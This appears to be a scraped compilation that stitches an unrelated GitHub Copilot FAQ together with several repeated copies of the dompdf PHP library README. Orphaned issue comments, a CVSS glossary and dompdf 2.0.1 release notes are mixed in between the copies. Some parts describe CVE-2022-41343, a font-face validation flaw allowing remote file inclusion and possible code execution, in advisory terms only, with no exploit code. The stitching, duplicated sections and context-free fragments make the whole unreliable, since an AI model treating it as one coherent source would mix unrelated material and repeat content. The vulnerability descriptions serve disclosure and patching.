1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).
2. Feature in public beta for Copilot Pro and Business plans. Requires use of repositories, issues, discussions, Actions, and other features of GitHub.
3. Authentication with SAML single sign-on (SSO) available for organizations using GitHub Enterprise Cloud.

GeneralPlans & PricingPrivacyResponsible AI
### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model.

That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses.

Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).
2. Feature in public beta for Copilot Pro and Business plans. Requires use of repositories, issues, discussions, Actions, and other features of GitHub.
3. Authentication with SAML single sign-on (SSO) available for organizations using GitHub Enterprise Cloud.

## Footnotes

1. [Authentication with SAML single sign-on (SSO)](https://docs.github.com/en/enterprise-cloud%40latest/authentication/authenticating-with-saml-single-sign-on/about-authentication-with-saml-single-sign-on) available for organizations using GitHub Enterprise Cloud.

**Dompdf is an HTML to PDF converter**

At its heart, dompdf is (mostly) a [CSS 2.1](http://www.w3.org/TR/CSS2/) compliant
HTML layout and rendering engine written in PHP. It is a style-driven renderer:
it will download and read external stylesheets, inline style tags, and the style
attributes of individual HTML elements. It also supports most presentational
HTML attributes.

*This document applies to the latest stable code which may not reflect the current
release. For released code please
[navigate to the appropriate tag](https://github.com/dompdf/dompdf/tags).*

---

## Features

* Handles most CSS 2.1 and a few CSS3 properties, including @import, @media &
  @page rules
* Supports most presentational HTML 4.0 attributes
* Supports external stylesheets, either local or through http/ftp (via
  fopen-wrappers)
* Supports complex tables, including row & column spans, separate & collapsed
  border models, individual cell styling
* Image support (gif, png (8, 24 and 32 bit with alpha channel), bmp & jpeg)
* No dependencies on external PDF libraries, thanks to the R&OS PDF class
* Inline PHP support
* Basic SVG support (see "Limitations" below)

## Requirements

* PHP version 7.1 or higher
* DOM extension
* MBString extension
* php-font-lib
* php-svg-lib

Note that some required dependencies may have further dependencies
(notably php-svg-lib requires sabberworm/php-css-parser).

### Recommendations

* OPcache (OPcache, XCache, APC, etc.): improves performance
* GD (for image processing)
* IMagick or GMagick extension: improves image processing performance

Visit the wiki for more information:
<https://github.com/dompdf/dompdf/wiki/Requirements>

## About Fonts & Character Encoding

PDF documents internally support the following fonts: Helvetica, Times-Roman,
Courier, Zapf-Dingbats, & Symbol. These fonts only support Windows ANSI
encoding. In order for a PDF to display characters that are not available in
Windows ANSI, you must supply an external font. Dompdf will embed any referenced
font in the PDF so long as it has been pre-loaded or is accessible to dompdf and
reference in CSS @font-face rules. See the
[font overview](https://github.com/dompdf/dompdf/wiki/About-Fonts-and-Character-Encoding)
for more information on how to use fonts.

The [DejaVu TrueType fonts](https://dejavu-fonts.github.io/) have been pre-installed
to give dompdf decent Unicode character coverage by default. To use the DejaVu
fonts reference the font in your stylesheet, e.g. `body { font-family: DejaVu Sans; }` (for DejaVu Sans). The following DejaVu 2.34 fonts are available:
DejaVu Sans, DejaVu Serif, and DejaVu Sans Mono.

## Easy Installation

### Install with composer

To install with [Composer](https://getcomposer.org/), simply require the
latest version of this package.

```
composer require dompdf/dompdf
```

Make sure that the autoload file from Composer is loaded.

```
// somewhere early in your project's loading, require the Composer autoloader
// see: http://getcomposer.org/doc/00-intro.md
require 'vendor/autoload.php';
```

### Download and install

Download a packaged archive of dompdf and extract it into the
directory where dompdf will reside

* You can download stable copies of dompdf from
  <https://github.com/dompdf/dompdf/releases>
* Or download a nightly (the latest, unreleased code) from
  <http://eclecticgeek.com/dompdf>

Use the packaged release autoloader to load dompdf, libraries,
and helper functions in your PHP:

```
// include autoloader
require_once 'dompdf/autoload.inc.php';
```

Note: packaged releases are named according using semantic
versioning (*dompdf\_MAJOR-MINOR-PATCH.zip*). So the 1.0.0
release would be dompdf\_1-0-0.zip. This is the only download
that includes the autoloader for Dompdf and all its dependencies.

### Install with git

From the command line, switch to the directory where dompdf will
reside and run the following commands:

```
git clone https://github.com/dompdf/dompdf.git
cd dompdf/lib

git clone https://github.com/PhenX/php-font-lib.git php-font-lib
cd php-font-lib
git checkout 0.5.1
cd ..

git clone https://github.com/PhenX/php-svg-lib.git php-svg-lib
cd php-svg-lib
git checkout v0.3.2
cd ..

git clone https://github.com/sabberworm/PHP-CSS-Parser.git php-css-parser
cd php-css-parser
git checkout 8.1.0
```

Require dompdf and it's dependencies in your PHP.
For details see the [autoloader in the utils project](https://github.com/dompdf/utils/blob/master/autoload.inc.php).

## Quick Start

Just pass your HTML in to dompdf and stream the output:

```
// reference the Dompdf namespace
use Dompdf\Dompdf;

// instantiate and use the dompdf class
$dompdf = new Dompdf();
$dompdf->loadHtml('hello world');

// (Optional) Setup the paper size and orientation
$dompdf->setPaper('A4', 'landscape');

// Render the HTML as PDF
$dompdf->render();

// Output the generated PDF to Browser
$dompdf->stream();
```

### Setting Options

Set options during dompdf instantiation:

```
use Dompdf\Dompdf;
use Dompdf\Options;

$options = new Options();
$options->set('defaultFont', 'Courier');
$dompdf = new Dompdf($options);
```

or at run time

```
use Dompdf\Dompdf;

$dompdf = new Dompdf();
$options = $dompdf->getOptions();
$options->setDefaultFont('Courier');
$dompdf->setOptions($options);
```

See [Dompdf\Options](/dompdf/dompdf/blob/v2.0.0/src/Options.php) for a list of available options.

### Resource Reference Requirements

In order to protect potentially sensitive information Dompdf imposes
restrictions on files referenced from the local file system or the web.

Files accessed through web-based protocols have the following requirements:

* The Dompdf option "isRemoteEnabled" must be set to "true"
* PHP must either have the curl extension enabled or the
  allow\_url\_fopen setting set to true

Files accessed through the local file system have the following requirement:

* The file must fall within the path(s) specified for the Dompdf "chroot" option

## Limitations (Known Issues)

* Table cells are not pageable, meaning a table row must fit on a single page.
* Elements are rendered on the active page when they are parsed.
* Embedding "raw" SVG's (`<svg><path...></svg>`) isn't working yet, you need to
  either link to an external SVG file, or use a DataURI like this:
  ```
  $html = '<img src="data:image/svg+xml;base64,' . base64_encode($svg) . '" ...>';
  ```

| Any chance we can get a v1 update that includes the same fix? Currently it’s not possible to use Dompdf v1 in conjunction with `roave/security-advisories` due to this vulnerability.  ``` Your requirements could not be resolved to an installable set of packages.    Problem 1     - craftcms/commerce 3.x-dev requires dompdf/dompdf ^1.0.2 -> satisfiable by dompdf/dompdf[v1.0.2, ..., v1.2.2].     - roave/security-advisories dev-latest conflicts with dompdf/dompdf v1.2.2.     - roave/security-advisories dev-latest conflicts with dompdf/dompdf v1.1.1.     - Root composer.json requires roave/security-advisories dev-latest -> satisfiable by roave/security-advisories[dev-latest].     - Root composer.json requires craftcms/commerce @dev -> satisfiable by craftcms/commerce[3.x-dev]. ```  In this case Dompdf is being pulled in from [craftcms/commerce](https://github.com/craftcms/commerce) v3. We have updated the requirement to use Dompdf v2 in Commerce 4, however we cannot update v3 without introducing potential breaking changes. |

### **[bsweeney](/bsweeney)** commented [Oct 4, 2022](#issuecomment-1267224696)

| Earlier versions were vulnerable to the issue because there was even less validation. The logic related to resource validation significantly changed with the 2.0.0 release, which should have also addressed this bug except for the oversight in not returning on validation error. Because of the nature of the changes I'm not sure about back-porting the fix, I'll need to look into it a bit more.  Is it possible to suggest a Composer alias or override to work around the issue? |

| Not sure people who want `roave/security-advisories` included in `require-dev` are going to like the idea of pretending their dependencies aren’t vulnerable 🙃  But yeah if it’s not a quick backport, no worries. Just another reason to encourage people to keep things updated. |

| Not sure people who want roave/security-advisories included in require-dev are going to like the idea of pretending their dependencies aren’t vulnerable  Yeah, no, I get that. I wasn't thinking of pretending they aren't vulnerable. I was thinking of saying something along the lines of 1.2.3 => 2.0.1.  At any rate, I'll let you know if it looks like we can do a 1.x update. |

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

**Dompdf is an HTML to PDF converter**

At its heart, dompdf is (mostly) a [CSS 2.1](http://www.w3.org/TR/CSS2/) compliant
HTML layout and rendering engine written in PHP. It is a style-driven renderer:
it will download and read external stylesheets, inline style tags, and the style
attributes of individual HTML elements. It also supports most presentational
HTML attributes.

*This document applies to the latest stable code which may not reflect the current
release. For released code please
[navigate to the appropriate tag](https://github.com/dompdf/dompdf/tags).*

**Check out the [demo](http://eclecticgeek.com/dompdf/debug.php) and ask any
question on [StackOverflow](https://stackoverflow.com/questions/tagged/dompdf) or

## Features

* Handles most CSS 2.1 and a few CSS3 properties, including @import, @media &
  @page rules
* Supports most presentational HTML 4.0 attributes
* Supports external stylesheets, either local or through http/ftp (via
  fopen-wrappers)
* Supports complex tables, including row & column spans, separate & collapsed
  border models, individual cell styling
* Image support (gif, png (8, 24 and 32 bit with alpha channel), bmp & jpeg)
* No dependencies on external PDF libraries, thanks to the R&OS PDF class
* Inline PHP support
* Basic SVG support (see "Limitations" below)

## Requirements

* PHP version 7.1 or higher
* DOM extension
* MBString extension
* php-font-lib
* php-svg-lib

Note that some required dependencies may have further dependencies
(notably php-svg-lib requires sabberworm/php-css-parser).

### Recommendations

* GD (for image processing)
  + Additionally, the IMagick or GMagick extension improves image processing performance for certain image types
* OPcache (OPcache, XCache, APC, etc.): improves performance

Visit the wiki for more information:
<https://github.com/dompdf/dompdf/wiki/Requirements>

## About Fonts & Character Encoding

PDF documents internally support the following fonts: Helvetica, Times-Roman,
Courier, Zapf-Dingbats, & Symbol. These fonts only support Windows ANSI
encoding. In order for a PDF to display characters that are not available in
Windows ANSI, you must supply an external font. Dompdf will embed any referenced
font in the PDF so long as it has been pre-loaded or is accessible to dompdf and
reference in CSS @font-face rules. See the
[font overview](https://github.com/dompdf/dompdf/wiki/About-Fonts-and-Character-Encoding)
for more information on how to use fonts.

The [DejaVu TrueType fonts](https://dejavu-fonts.github.io/) have been pre-installed
to give dompdf decent Unicode character coverage by default. To use the DejaVu
fonts reference the font in your stylesheet, e.g. `body { font-family: DejaVu Sans; }` (for DejaVu Sans). The following DejaVu 2.34 fonts are available:
DejaVu Sans, DejaVu Serif, and DejaVu Sans Mono.

## Easy Installation

### Install with composer

To install with [Composer](https://getcomposer.org/), simply require the
latest version of this package.

```
composer require dompdf/dompdf
```

Make sure that the autoload file from Composer is loaded.

```
// somewhere early in your project's loading, require the Composer autoloader
// see: http://getcomposer.org/doc/00-intro.md
require 'vendor/autoload.php';
```

### Download and install

Download a packaged archive of dompdf and extract it into the
directory where dompdf will reside

* You can download stable copies of dompdf from
  <https://github.com/dompdf/dompdf/releases>
* Or download a nightly (the latest, unreleased code) from
  <http://eclecticgeek.com/dompdf>

Use the packaged release autoloader to load dompdf, libraries,
and helper functions in your PHP:

```
// include autoloader
require_once 'dompdf/autoload.inc.php';
```

Note: packaged releases are named according using semantic
versioning (*dompdf\_MAJOR-MINOR-PATCH.zip*). So the 1.0.0
release would be dompdf\_1-0-0.zip. This is the only download
that includes the autoloader for Dompdf and all its dependencies.

### Install with git

From the command line, switch to the directory where dompdf will
reside and run the following commands:

```
git clone https://github.com/dompdf/dompdf.git
cd dompdf/lib

git clone https://github.com/PhenX/php-font-lib.git php-font-lib
cd php-font-lib
git checkout 0.5.1
cd ..

git clone https://github.com/PhenX/php-svg-lib.git php-svg-lib
cd php-svg-lib
git checkout v0.3.2
cd ..

git clone https://github.com/sabberworm/PHP-CSS-Parser.git php-css-parser
cd php-css-parser
git checkout 8.1.0
```

Require dompdf and it's dependencies in your PHP.
For details see the [autoloader in the utils project](https://github.com/dompdf/utils/blob/master/autoload.inc.php).

## Framework Integration

* For Symfony: [nucleos/dompdf-bundle](https://github.com/nucleos/NucleosDompdfBundle)
* For Laravel: [barryvdh/laravel-dompdf](https://github.com/barryvdh/laravel-dompdf)
* For Redaxo: [PdfOut](https://github.com/FriendsOfREDAXO/pdfout)

## Quick Start

Just pass your HTML in to dompdf and stream the output:

```
// reference the Dompdf namespace
use Dompdf\Dompdf;

// instantiate and use the dompdf class
$dompdf = new Dompdf();
$dompdf->loadHtml('hello world');

// (Optional) Setup the paper size and orientation
$dompdf->setPaper('A4', 'landscape');

// Render the HTML as PDF
$dompdf->render();

// Output the generated PDF to Browser
$dompdf->stream();
```

### Setting Options

Set options during dompdf instantiation:

```
use Dompdf\Dompdf;
use Dompdf\Options;

$options = new Options();
$options->set('defaultFont', 'Courier');
$dompdf = new Dompdf($options);
```

or at run time

```
use Dompdf\Dompdf;

$dompdf = new Dompdf();
$options = $dompdf->getOptions();
$options->setDefaultFont('Courier');
$dompdf->setOptions($options);
```

See [Dompdf\Options](/dompdf/dompdf/blob/master/src/Options.php) for a list of available options.

### Resource Reference Requirements

In order to protect potentially sensitive information Dompdf imposes
restrictions on files referenced from the local file system or the web.

Files accessed through web-based protocols have the following requirements:

* The Dompdf option "isRemoteEnabled" must be set to "true"
* PHP must either have the curl extension enabled or the
  allow\_url\_fopen setting set to true

Files accessed through the local file system have the following requirement:

* The file must fall within the path(s) specified for the Dompdf "chroot" option

## Limitations (Known Issues)

* Table cells are not pageable, meaning a table row must fit on a single page.
* Elements are rendered on the active page when they are parsed.
* Embedding "raw" SVG's (`<svg><path...></svg>`) isn't working yet, you need to
  either link to an external SVG file, or use a DataURI like this:
  ```
  $html = '<img src="data:image/svg+xml;base64,' . base64_encode($svg) . '" ...>';
  ```

  Watch [#320](https://github.com/dompdf/dompdf/issues/320) for progress
* Does not support CSS flexbox.
* Does not support CSS Grid.
* A single Dompdf instance should not be used to render more than one HTML document
  because persisted parsing and rendering artifacts can impact future renders.

***This release has been superseded by [version 2.0.2](https://github.com/dompdf/dompdf/releases/tag/v2.0.2)***

**Change highlights since 2.0.0**

* Improved font-face declaration parsing and handling. External fonts are now restricted by resource access constraints.
* Improved layout of images with percentage-based dimensions

***This release addresses the following vulnerabilities:***

| Vulnerability | References | Type | Severity |
| --- | --- | --- | --- |
| Remote Code Execution via font installation | [#2994](https://github.com/dompdf/dompdf/issues/2994), [CVE-2022-41343](https://nvd.nist.gov/vuln/detail/CVE-2022-41343#vulnCurrentDescriptionTitle), [Tanto](https://tantosec.com/blog/cve-2022-41343/) | Remote Code Execution | Critical |

**2.0.x highlights**

* Modifies callback and page\_script/page\_text handling
* Switches the HTML5 parser to Masterminds/HTML5
* Improves CSS property parsing and representation
* Switches installed fonts and font metrics cache file format to JSON

The list of addressed issues can be found in the [2.0.1](https://github.com/dompdf/dompdf/milestone/20?closed=1) release milestone. View all changes since the previous release in the [commit history](https://github.com/dompdf/dompdf/compare/v2.0.0...v2.0.1).

We would like to extend our gratitude to the [community members](https://github.com/dompdf/dompdf/graphs/contributors) who helped make this release possible.

**Requirements**

Dompdf 2.0.1 requires the following:

* PHP 7.1 or greater
* html5-php v2.0.0 or greater
* php-font-lib v0.5.4 or greater
* php-svg-lib v0.3.3 or greater

Note that some dependencies may have further dependencies (notably php-svg-lib requires sabberworm/php-css-parser).

Additionally, the following are recommended for optimal use:

* GD (for image processing)

For full requirements and recommendations see the [requirements page on the wiki](https://github.com/dompdf/dompdf/wiki/Requirements).

**Download Instructions**

The dompdf team recommends that you use Composer for easier dependency management.

If you're not yet using Composer you can download a packaged release of dompdf which includes all the files you need to use the library. Click the link labeled "dompdf\_2-0-1.zip" for the packaged release. The download options labeled "Source code" are auto-generated by github and do not include all the dependencies.

**Dompdf is an HTML to PDF converter**

At its heart, dompdf is (mostly) a [CSS 2.1](http://www.w3.org/TR/CSS2/) compliant
HTML layout and rendering engine written in PHP. It is a style-driven renderer:
it will download and read external stylesheets, inline style tags, and the style
attributes of individual HTML elements. It also supports most presentational
HTML attributes.

*This document applies to the latest stable code which may not reflect the current
release. For released code please
[navigate to the appropriate tag](https://github.com/dompdf/dompdf/tags).*

**Check out the [demo](http://eclecticgeek.com/dompdf/debug.php) and ask any
question on [StackOverflow](https://stackoverflow.com/questions/tagged/dompdf) or

## Features

* Handles most CSS 2.1 and a few CSS3 properties, including @import, @media &
  @page rules
* Supports most presentational HTML 4.0 attributes
* Supports external stylesheets, either local or through http/ftp (via
  fopen-wrappers)
* Supports complex tables, including row & column spans, separate & collapsed
  border models, individual cell styling
* Image support (gif, png (8, 24 and 32 bit with alpha channel), bmp & jpeg)
* No dependencies on external PDF libraries, thanks to the R&OS PDF class
* Inline PHP support
* Basic SVG support (see "Limitations" below)

## Requirements

* PHP version 7.1 or higher
* DOM extension
* MBString extension
* php-font-lib
* php-svg-lib

Note that some required dependencies may have further dependencies
(notably php-svg-lib requires sabberworm/php-css-parser).

### Recommendations

* OPcache (OPcache, XCache, APC, etc.): improves performance
* GD (for image processing)
* IMagick or GMagick extension: improves image processing performance

Visit the wiki for more information:
<https://github.com/dompdf/dompdf/wiki/Requirements>

## About Fonts & Character Encoding

PDF documents internally support the following fonts: Helvetica, Times-Roman,
Courier, Zapf-Dingbats, & Symbol. These fonts only support Windows ANSI
encoding. In order for a PDF to display characters that are not available in
Windows ANSI, you must supply an external font. Dompdf will embed any referenced
font in the PDF so long as it has been pre-loaded or is accessible to dompdf and
reference in CSS @font-face rules. See the
[font overview](https://github.com/dompdf/dompdf/wiki/About-Fonts-and-Character-Encoding)
for more information on how to use fonts.

The [DejaVu TrueType fonts](https://dejavu-fonts.github.io/) have been pre-installed
to give dompdf decent Unicode character coverage by default. To use the DejaVu
fonts reference the font in your stylesheet, e.g. `body { font-family: DejaVu Sans; }` (for DejaVu Sans). The following DejaVu 2.34 fonts are available:
DejaVu Sans, DejaVu Serif, and DejaVu Sans Mono.

## Easy Installation

### Install with composer

To install with [Composer](https://getcomposer.org/), simply require the
latest version of this package.

```
composer require dompdf/dompdf
```

Make sure that the autoload file from Composer is loaded.

```
// somewhere early in your project's loading, require the Composer autoloader
// see: http://getcomposer.org/doc/00-intro.md
require 'vendor/autoload.php';
```

### Download and install

Download a packaged archive of dompdf and extract it into the
directory where dompdf will reside

* You can download stable copies of dompdf from
  <https://github.com/dompdf/dompdf/releases>
* Or download a nightly (the latest, unreleased code) from
  <http://eclecticgeek.com/dompdf>

Use the packaged release autoloader to load dompdf, libraries,
and helper functions in your PHP:

```
// include autoloader
require_once 'dompdf/autoload.inc.php';
```

Note: packaged releases are named according using semantic
versioning (*dompdf\_MAJOR-MINOR-PATCH.zip*). So the 1.0.0
release would be dompdf\_1-0-0.zip. This is the only download
that includes the autoloader for Dompdf and all its dependencies.

### Install with git

From the command line, switch to the directory where dompdf will
reside and run the following commands:

```
git clone https://github.com/dompdf/dompdf.git
cd dompdf/lib

git clone https://github.com/PhenX/php-font-lib.git php-font-lib
cd php-font-lib
git checkout 0.5.1
cd ..

git clone https://github.com/PhenX/php-svg-lib.git php-svg-lib
cd php-svg-lib
git checkout v0.3.2
cd ..

git clone https://github.com/sabberworm/PHP-CSS-Parser.git php-css-parser
cd php-css-parser
git checkout 8.1.0
```

Require dompdf and it's dependencies in your PHP.
For details see the [autoloader in the utils project](https://github.com/dompdf/utils/blob/master/autoload.inc.php).

## Quick Start

Just pass your HTML in to dompdf and stream the output:

```
// reference the Dompdf namespace
use Dompdf\Dompdf;

// instantiate and use the dompdf class
$dompdf = new Dompdf();
$dompdf->loadHtml('hello world');

// (Optional) Setup the paper size and orientation
$dompdf->setPaper('A4', 'landscape');

// Render the HTML as PDF
$dompdf->render();

// Output the generated PDF to Browser
$dompdf->stream();
```

### Setting Options

Set options during dompdf instantiation:

```
use Dompdf\Dompdf;
use Dompdf\Options;

$options = new Options();
$options->set('defaultFont', 'Courier');
$dompdf = new Dompdf($options);
```

or at run time

```
use Dompdf\Dompdf;

$dompdf = new Dompdf();
$options = $dompdf->getOptions();
$options->setDefaultFont('Courier');
$dompdf->setOptions($options);
```

See [Dompdf\Options](/dompdf/dompdf/blob/v2.0.0/src/Options.php) for a list of available options.

### Resource Reference Requirements

In order to protect potentially sensitive information Dompdf imposes
restrictions on files referenced from the local file system or the web.

Files accessed through web-based protocols have the following requirements:

* The Dompdf option "isRemoteEnabled" must be set to "true"
* PHP must either have the curl extension enabled or the
  allow\_url\_fopen setting set to true

Files accessed through the local file system have the following requirement:

* The file must fall within the path(s) specified for the Dompdf "chroot" option

## Limitations (Known Issues)

* Table cells are not pageable, meaning a table row must fit on a single page.
* Elements are rendered on the active page when they are parsed.
* Embedding "raw" SVG's (`<svg><path...></svg>`) isn't working yet, you need to
  either link to an external SVG file, or use a DataURI like this:
  ```
  $html = '<img src="data:image/svg+xml;base64,' . base64_encode($svg) . '" ...>';
  ```

| When a font is registered through the `@font-face` rule the URL is run through validation that was implemented to address the issues outlined in [#2564](https://github.com/dompdf/dompdf/issues/2564). The validation logic specific to the font-face rule, however, does not actually halt processing of the font when validation fails. As a result, a system running Dompdf 2.0.0 is vulnerable to remote file inclusion though the font installation routines and that *may* lead to code execution due to PHAR deserialization vulnerability if the system is running a vulnerable version of PHP (< 8.0.0).  References:   * [Tanto: RCE via PHAR Deserialization](https://tantosec.com/blog/cve-2022-41343/) * [CVE-2022-41343](https://github.com/advisories/GHSA-6x28-7h8c-chx4 "CVE-2022-41343") ([nist](https://nvd.nist.gov/vuln/detail/CVE-2022-41343)) |

**Dompdf is an HTML to PDF converter**

At its heart, dompdf is (mostly) a [CSS 2.1](http://www.w3.org/TR/CSS2/) compliant
HTML layout and rendering engine written in PHP. It is a style-driven renderer:
it will download and read external stylesheets, inline style tags, and the style
attributes of individual HTML elements. It also supports most presentational
HTML attributes.

*This document applies to the latest stable code which may not reflect the current
release. For released code please
[navigate to the appropriate tag](https://github.com/dompdf/dompdf/tags).*

## Features

* Handles most CSS 2.1 and a few CSS3 properties, including @import, @media &
  @page rules
* Supports most presentational HTML 4.0 attributes
* Supports external stylesheets, either local or through http/ftp (via
  fopen-wrappers)
* Supports complex tables, including row & column spans, separate & collapsed
  border models, individual cell styling
* Image support (gif, png (8, 24 and 32 bit with alpha channel), bmp & jpeg)
